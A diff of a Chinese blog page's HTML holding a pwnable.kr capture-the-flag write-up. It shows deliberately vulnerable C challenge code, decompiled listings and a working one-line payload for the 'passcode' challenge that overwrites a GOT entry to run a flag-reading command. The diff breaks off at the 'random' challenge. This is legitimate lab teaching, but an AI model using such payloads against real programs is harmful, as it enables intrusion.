@@ -4,20 +4,19 @@
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
-        <title>Pwnable.kr - JuicyMio&#39;s blog</title><meta name="Description" content="Plus Ultra"><meta property="og:title" content="Pwnable.kr" />
-<meta property="og:description" content="pwnable.kr writeup 1 fd 文件描述符(file descricptor) 维基百科：文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件" />
+        <title>Pwnable.kr - JuicyMio&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="Pwnable.kr" />
+<meta property="og:description" content="pwnable.kr writeup 1 fd文件描述符(file descricptor) 维基百科：文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://juicymio.github.io/pwnable.kr/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-10-12T17:19:11+08:00" />
-<meta property="article:modified_time" content="2022-10-12T17:19:11+08:00" /><meta property="og:site_name" content="JuicyMio&#39;s Blog" />
+<meta property="article:modified_time" content="2022-10-12T17:19:11+08:00" />
 
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Pwnable.kr"/>
-<meta name="twitter:description" content="pwnable.kr writeup 1 fd 文件描述符(file descricptor) 维基百科：文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件"/>
-<meta name="application-name" content="My cool site">
-<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Pwnable.kr"/>
+<meta name="twitter:description" content="pwnable.kr writeup 1 fd文件描述符(file descricptor) 维基百科：文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文"/>
+<meta name="application-name" content="JuicyMio&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="JuicyMio&#39;s blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://juicymio.github.io/pwnable.kr/" /><link rel="next" href="http://juicymio.github.io/c/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://juicymio.github.io/pwnable.kr/" /><link rel="next" href="http://juicymio.github.io/c/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
         <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
         <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
     {
@@ -28,7 +27,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http:\/\/juicymio.github.io\/pwnable.kr\/"
-        },"genre": "posts","keywords": "pwn","wordcount":  6191 ,
+        },"genre": "posts","keywords": "pwn","wordcount":  6209 ,
         "url": "http:\/\/juicymio.github.io\/pwnable.kr\/","datePublished": "2022-10-12T17:19:11+08:00","dateModified": "2022-10-12T17:19:11+08:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -37,7 +36,7 @@
             },"description": ""
     }
     </script></head>
-    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : '' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
 
         <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
     <div class="header-wrapper">
@@ -102,7 +101,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Pwnable.kr</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>JuicyMio</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-10-12">2022-10-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;6191 words&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-10-12">2022-10-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;6209 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;13 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="true">
                 <div class="details-summary toc-title">
@@ -135,9 +134,9 @@
     </li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><h1 id="pwnablekr-writeup">pwnable.kr writeup</h1>
-<h2 id="1-fd">1 fd</h2>
-<p>文件描述符(file descricptor)</p>
+            </div><div class="content" id="content"><h1 id="pwnablekr-writeup" class="headerLink">
+    <a href="#pwnablekr-writeup" class="header-mark"></a>pwnable.kr writeup</h1><h2 id="1-fd" class="headerLink">
+    <a href="#1-fd" class="header-mark"></a>1 fd</h2><p>文件描述符(file descricptor)</p>
 <blockquote>
 <p>维基百科：文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。</p>
 </blockquote>
@@ -174,18 +173,18 @@
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[]){</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;pass argv[1] a number</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;pass argv[1] a number</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">)</span> <span class="o">-</span> <span class="mh">0x1234</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">)</span> <span class="o">-</span> <span class="mh">0x1234</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">len</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="s">&#34;LETMEWIN</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">)){</span>
-</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;good job :)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">len</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="s">&#34;LETMEWIN</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;good job :)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;learn about Linux file IO</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;learn about Linux file IO</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
@@ -198,7 +197,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">)</span> <span class="o">-</span> <span class="mh">0x1234</span><span class="p">;</span>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">atoi</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">)</span> <span class="o">-</span> <span class="mh">0x1234</span><span class="p">;</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>其中atoi是将字符串转化为整数的函数</p>
@@ -224,9 +223,9 @@
 <p>atoi不能转化16进制数, 所以我们手动转换0x1234, 它的十进制表示是4660
 这样我们就可以让fd = 0, 程序等待从stdin中读取字符
 我们再向命令行中输入LETMEWIN, 即可得到flag</p>
-<h2 id="2-collision">2 collision</h2>
-<h2 id="5-passcode">5 passcode</h2>
-<p><strong>这题没太懂GOT PLT那里的具体原理</strong></p>
+<h2 id="2-collision" class="headerLink">
+    <a href="#2-collision" class="header-mark"></a>2 collision</h2><h2 id="5-passcode" class="headerLink">
+    <a href="#5-passcode" class="header-mark"></a>5 passcode</h2><p><strong>这题没太懂GOT PLT那里的具体原理</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -277,38 +276,38 @@
 </span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">login</span><span class="p">(){</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">passcode1</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">passcode2</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;enter passcode1 : &#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">passcode1</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;enter passcode1 : &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">passcode1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="c1">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;enter passcode2 : &#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">passcode2</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;checking...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;enter passcode2 : &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">passcode2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;checking...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">passcode1</span><span class="o">==</span><span class="mi">338150</span> <span class="o">&amp;&amp;</span> <span class="n">passcode2</span><span class="o">==</span><span class="mi">13371337</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Login OK!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Login OK!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
-</span></span><span class="line"><span class="cl">                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Login Failed!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Login Failed!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">welcome</span><span class="p">(){</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;enter you name : &#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%100s&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Welcome %s!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;enter you name : &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%100s&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Welcome %s!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
-</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Toddler&#39;s Secure Login System 1.0 beta.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span> 
-</span></span><span class="line"><span class="cl">        <span class="n">welcome</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">        <span class="n">login</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Toddler&#39;s Secure Login System 1.0 beta.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">        <span class="nf">welcome</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">login</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">        <span class="c1">// something after login...
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Now I can safely trust you that you have credential :)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Now I can safely trust you that you have credential :)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
@@ -319,7 +318,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">passcode1</span><span class="p">);</span>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">passcode1</span><span class="p">);</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>本应该为</p>
@@ -328,7 +327,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">passcode1</span><span class="p">);</span>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">passcode1</span><span class="p">);</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>也就是说scanf本该向passcode1所在地址写入内容, 却变成了将passcode1中存入的数作为地址, 向其写入内容. 这给了我们可乘之机, 如果能够覆盖passcode1的内容, 就可以向这个地址写入内容.
@@ -374,19 +373,19 @@
 </span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [esp+18h] [ebp-10h]
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-Ch]
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;enter passcode1 : &#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;enter passcode2 : &#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;checking...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;enter passcode1 : &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;enter passcode2 : &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;checking...&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">!=</span> <span class="mi">338150</span> <span class="o">||</span> <span class="n">v2</span> <span class="o">!=</span> <span class="mi">13371337</span> <span class="p">)</span>
 </span></span><span class="line"><span class="cl">  <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Login Failed!&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Login Failed!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Login OK!&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Login OK!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">welcome</span><span class="p">()</span>
@@ -394,11 +393,11 @@
 </span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">v1</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span> <span class="c1">// [esp+18h] [ebp-70h] BYREF
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [esp+7Ch] [ebp-Ch]
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;enter you name : &#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%100s&#34;</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Welcome %s!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="nf">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;enter you name : &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%100s&#34;</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Welcome %s!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v2</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
@@ -541,8 +540,8 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>0x080485e3=134514147</p>
-<h3 id="实现">实现:</h3>
-<div class="highlight"><div class="chroma">
+<h3 id="实现" class="headerLink">
+    <a href="#%e5%ae%9e%e7%8e%b0" class="header-mark"></a>实现:</h3><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
@@ -550,8 +549,8 @@
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;print &#34;A&#34;*96+&#34;</span><span class="se">\x00\xa0\x04\x08</span><span class="s1">&#34;+&#34;134514147</span><span class="se">\n</span><span class="s1">&#34;&#39;</span> <span class="o">|</span> <span class="o">./</span><span class="n">passcode</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="6-random">6 random</h2>
-<div class="highlight"><div class="chroma">
+</div><h2 id="6-random" class="headerLink">
+    <a href="#6-random" class="header-mark"></a>6 random</h2><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -577,15 +576,15 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">random</span><span class="p">;</span>
